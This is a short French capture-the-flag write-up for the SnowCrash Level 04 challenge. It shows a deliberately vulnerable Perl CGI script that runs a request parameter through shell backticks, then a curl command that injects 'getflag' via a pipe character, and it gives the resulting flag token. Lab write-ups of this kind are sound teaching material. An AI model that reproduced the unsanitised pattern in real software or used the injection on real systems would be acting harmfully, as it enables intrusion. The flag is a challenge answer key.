
# Level 04 - Solution

## Étape 1 : Découverte du script Perl

On remarque un fichier Perl qui comporte une configuration web écoutant sur le port **4747** :

```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

## Étape 2 : Analyse du code

### Utiliser curl pour exploiter la vulnérabilité

On utilise le caractère pipe `|` pour chaîner notre commande :

```bash
level04@SnowCrash:~$ curl "http://localhost:4747/?x=|getflag"
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

## Résultat

**Flag** : `ne2searoevaevoem4ov4ar8ap`

